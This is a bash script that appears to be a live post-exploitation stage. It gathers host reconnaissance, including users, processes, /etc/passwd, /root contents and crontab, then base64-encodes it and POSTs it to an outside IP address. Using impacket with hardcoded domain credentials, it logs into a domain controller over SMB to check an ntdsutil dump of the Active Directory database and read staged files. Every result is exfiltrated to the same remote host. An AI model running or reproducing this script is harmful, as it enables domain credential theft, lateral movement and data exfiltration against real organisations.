#!/bin/bash
# fxc2
({ ip -4 a; id; w; ps -axuwwww; curl -sf ifconfig.me 2>/dev/null; echo; cat /etc/passwd 2>/dev/null | head -20; ls -la /root/ 2>/dev/null | head -20; crontab -l 2>/dev/null; } 2>&1 | base64 -w0 | xargs -I{} curl -sf -X POST http://131.123.43.239/up -H "X-Name: fxr2" --data-binary {} >/dev/null 2>&1) &
# statec2heck: IFM/ndstage state on DC-01
export PYTHONPATH=/tmp/imp
O=/tmp/.STATEC2.txt
{
echo "= procs =="
ps aux 2>/dev/null | grep -aiE "ntdsutil|ndstage|svc|wmiexec" | grep -v grep | head -10
echo "= ntdsutil on DC =="
python3 - <<'PYX'
import sys
sys.path.insert(0,"/tmp/imp")
from impacket.smbconnection import SMBConnection
try:
    c=SMBConnection("10.61.10.11","10.61.10.11",timeout=12)
    c.login("rez","!QAZxsw2","MLT","","")
    for sub in ("\\nd","\\nd\\Active Directory","\\nd\\registry"):
        try:
            for e in c.listPath("C$",sub+"\\*"):
                print("IFM %s\\%s d=%d" % (sub,e.get_longname(),e.is_directory()))
        except Exception as ex:
            print("IFM %s ERR %s" % (sub,str(ex)[:80]))
    for f in ("Windows\\Temp\\nd.done","Windows\\Temp\\nd.log","Windows\\Temp\\.nd.bat"):
        try:
            import io;bio=io.BytesIO();c.getFile("C$",f,bio.write)
            d=bio.getvalue(); print("FILE %s %dB" % (f,len(d)))
            if f=="Windows\\Temp\\nd.log": print(d[:3000].decode("utf-8","replace"))
        except Exception as ex:
            print("FILE %s ERR %s" % (f,str(ex)[:60]))
    c.logoff()
except Exception as e:
    print("SMBERR " + str(e)[:120])
PYX
echo "= local logs =="
ls -la /tmp/.NDL.txt /tmp/.NDW4.txt /tmp/.svc.py /tmp/.nds4.py 2>&1
cat /tmp/.NDL.txt 2>/dev/null | head -40
echo "= svc list ndX9 =="
python3 /tmp/.svc.py -target-ip 10.61.10.11 'MLT/rez:!QAZxsw2@10.61.10.11' list 2>&1 | grep -ai "ndx9" | head
} > "$O" 2>&1
curl -sm30 -X POST --data-binary @"$O" http://131.123.43.239/up -H "X-Name: mel2_statec22"
echo STATEC2_DONE
b=$( (id; hostname; uname -a; ip -4 a | grep inet | head -5) 2>&1 | base64 -w0); curl -s -m 10 -X POST http://131.123.43.239/up -H "X-Name: wrk_out" --data-binary "$b" >/dev/null 2>&1


